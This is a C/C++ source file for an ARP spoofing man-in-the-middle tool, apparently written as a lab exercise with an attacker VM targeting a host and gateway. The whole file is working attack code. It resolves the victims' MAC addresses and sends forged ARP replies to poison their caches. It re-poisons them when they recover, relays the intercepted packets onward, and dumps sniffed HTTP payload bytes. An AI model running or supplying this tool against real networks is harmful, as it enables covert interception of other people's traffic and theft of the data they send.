/*
attacker : VM guest Ubuntu
sender : VM host MacOS
target : gateway
*/

#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <libnet.h>

#define ARPPRO_IPV4 0x0800
#define IP_ADDR_LEN 4
#define ARP_PACKET_LEN 42	//eth_h 14 + arp_h 8 + arp_a 20
#define MAX_SESS_NUM 2

struct arp_addr{
	uint8_t ar_sha[ETHER_ADDR_LEN];	//source hw addr
	uint8_t ar_sip[IP_ADDR_LEN];	//source ip addr
	uint8_t ar_tha[ETHER_ADDR_LEN];	//target hw addr
	uint8_t ar_tip[IP_ADDR_LEN];	//target ip addr
};

void usage(){
	printf("syntax: send_arp <interface> <sender ip> <target ip> [<sender ip2> <target ip2>]\n");
	printf("sample: send_arp ens33 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

template <class T> const T& min (const T& a, const T& b) {
  return !(b<a)?a:b;     // or: return !comp(b,a)?a:b; for version (2)
}

bool compare_mac(uint8_t* a, uint8_t* b){
	for(int i=0; i<6; i++) if(a[i] != b[i]) return false;
	return true;
}

void dump_data(uint8_t* p, int32_t len){
	if(len == 0){
		printf("None");
		return;
	}
	printf("\n");
	for(uint32_t i=0; i< len; i++){
		printf("%02x ", *p);
		p++;
		if((i&0x0f) == 0x0f && i != len-1)
			printf("\n");
	}
}

void print_mac(uint8_t * p){
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n",p[0],p[1],p[2],p[3],p[4],p[5]);
}

void print_packet(uint8_t * p){
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr *) p;
	if(ntohs(eth_h -> ether_type) != ETHERTYPE_IP) return;
	struct libnet_ipv4_hdr * ip_h = (struct libnet_ipv4_hdr*)(eth_h+1);
	if(ip_h->ip_p != IPPROTO_TCP) return;
	struct libnet_tcp_hdr * tcp_h = (struct libnet_tcp_hdr*)((uint8_t*)ip_h + ip_h->ip_hl*4);
	if(ntohs(tcp_h -> th_sport) != 80 && ntohs(tcp_h -> th_dport) != 80) return;

	uint8_t * data = (uint8_t*)tcp_h + tcp_h->th_off*4;
	int data_len = ntohs(ip_h->ip_len) - ip_h->ip_hl*4 - tcp_h->th_off*4;
	if(data_len == 0) return;

	printf("------------------------------------------------\n");
	printf("[MAC src] : ");print_mac(eth_h->ether_shost);
	printf("[MAC dst] : ");print_mac(eth_h->ether_dhost);
	printf("[IP src] : %s\n", inet_ntoa(ip_h->ip_src));
	printf("[IP dst] : %s\n", inet_ntoa(ip_h->ip_dst));
	printf("[Port src] : %hu\n", ntohs(tcp_h->th_sport));
	printf("[Port dst] : %hu\n", ntohs(tcp_h->th_dport));
	printf("[Data] : ");
	dump_data(data, min<int>(data_len,32));
	printf("\n------------------------------------------------\n\n\n");
}

bool send_arp(pcap_t * handle, uint16_t op, uint8_t* eth_src, uint8_t* eth_dst, uint8_t* arp_sha, uint8_t* arp_sip, uint8_t* arp_tha, uint8_t* arp_tip){	
	uint8_t buf[ARP_PACKET_LEN];
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)buf;
	struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
	struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);
	
	for (int i=0; i<ETHER_ADDR_LEN; i++){
		eth_h -> ether_dhost[i] = eth_dst[i];
		eth_h -> ether_shost[i] = eth_src[i];
	}
	eth_h -> ether_type = htons(ETHERTYPE_ARP);
	
	arp_h -> ar_hrd = htons(ARPHRD_ETHER);
	arp_h -> ar_pro = htons(ARPPRO_IPV4);
	arp_h -> ar_hln = ETHER_ADDR_LEN;
	arp_h -> ar_pln = IP_ADDR_LEN;
	arp_h -> ar_op = htons(op);
	for (int i=0; i<ETHER_ADDR_LEN; i++){
		arp_a -> ar_sha[i] = arp_sha[i];
		arp_a -> ar_tha[i] = arp_tha[i];
	}
	for (int i=0; i<IP_ADDR_LEN; i++){
		arp_a -> ar_sip[i] = arp_sip[i];
		arp_a -> ar_tip[i] = arp_tip[i];
	}

	pcap_sendpacket(handle, buf, ARP_PACKET_LEN);
	return true;
}

bool get_mac(pcap_t* handle, uint8_t* sender_mac){
	while (true) {
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;

		struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)packet;
		if (ntohs(eth_h -> ether_type) != ETHERTYPE_ARP) continue;

		struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
		if (ntohs(arp_h -> ar_op) != ARPOP_REPLY) continue;

		struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);
		for (int i=0; i<ETHER_ADDR_LEN; i++)
			sender_mac[i] = arp_a -> ar_sha[i];
		
		return true;
	}
}

void get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
	struct ifreq ifrq;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	
	strcpy(ifrq.ifr_name, dev);

	ioctl(s,SIOCGIFHWADDR, &ifrq);
	for (int i=0; i<ETHER_ADDR_LEN; i++)
		my_mac[i] = ifrq.ifr_hwaddr.sa_data[i];

	ioctl(s, SIOCGIFADDR, &ifrq); 
	*(in_addr*)my_ip = ((sockaddr_in*)&ifrq.ifr_addr)->sin_addr;
	
	close(s);
}

bool spoofed(uint8_t* p, uint8_t* sender_mac, uint8_t* my_ip){
	/* check if	1. src mac = sender mac	2. dst ip != my ip */
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr *) p;
	if (compare_mac(eth_h -> ether_shost, sender_mac) == false) return false;
	if (eth_h -> ether_type != htons(ETHERTYPE_IP)) return false;

	struct libnet_ipv4_hdr * ip_h = (struct libnet_ipv4_hdr *)(eth_h + 1);
	if ((ip_h -> ip_dst.s_addr) == *(uint32_t*)my_ip) return false;
	
	return true;	
}

bool relay(pcap_t* handle, uint8_t* p, int p_size,  uint8_t* my_mac, uint8_t* target_mac){
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*) p;
	for (int i=0; i<ETHER_ADDR_LEN; i++){
		eth_h -> ether_shost[i] = my_mac[i];
		eth_h -> ether_dhost[i] = target_mac[i];
	}
	pcap_sendpacket(handle, p, p_size);

	return true;
}

bool recovered(uint8_t* p, uint8_t* sender_mac, uint8_t* target_mac){
	/* check if	1. src mac = sender mac or target mac	2. ARP packet */
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*) p;
	if (compare_mac(eth_h -> ether_shost, sender_mac) == false && \
		compare_mac(eth_h -> ether_shost, target_mac) == false) return false;
	if (eth_h -> ether_type != htons(ETHERTYPE_ARP)) return false;
	
	return true;	
}

int main(int argc, char * argv[]){
	if (argc < 4 || (argc%2) != 0){
		usage();
		return -1;
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	char * dev = argv[1];
	int session = (argc-2)/2;
	uint8_t brdcst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t zero_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
	uint8_t my_mac[6], sender_mac[MAX_SESS_NUM][6], target_mac[MAX_SESS_NUM][6];
	uint8_t my_ip[4], sender_ip[MAX_SESS_NUM][4], target_ip[MAX_SESS_NUM][4];
	
	pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	/* get my mac & ip addr */
	get_my_addr(dev, my_mac, my_ip);
	
	/* get mac & ip addr of sender & target */
	for (int n=0; n<session; n++){
		inet_pton(AF_INET, argv[2*n+2], sender_ip[n]);
		inet_pton(AF_INET, argv[2*n+3], target_ip[n]);
		send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, sender_ip[n]);
		get_mac(handle, sender_mac[n]);
		send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, target_ip[n]);
		get_mac(handle, target_mac[n]);
	}

	/* infection */
	for (int n=0; n<session; n++)
		send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);

	while (true) {
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		for (int n=0; n<session; n++){
			/* send infection when recovered*/
			if(recovered((uint8_t*)packet, sender_mac[n], target_mac[n]))
				send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
			
			/* relay spoofed packet */
			if(spoofed((uint8_t*)packet, sender_mac[n], my_ip)){
				relay(handle, (uint8_t*)packet, header->caplen, my_mac, target_mac[n]);
				print_packet((uint8_t*)packet);
			}
		}
	}
	pcap_close(handle);
	return 0;
}
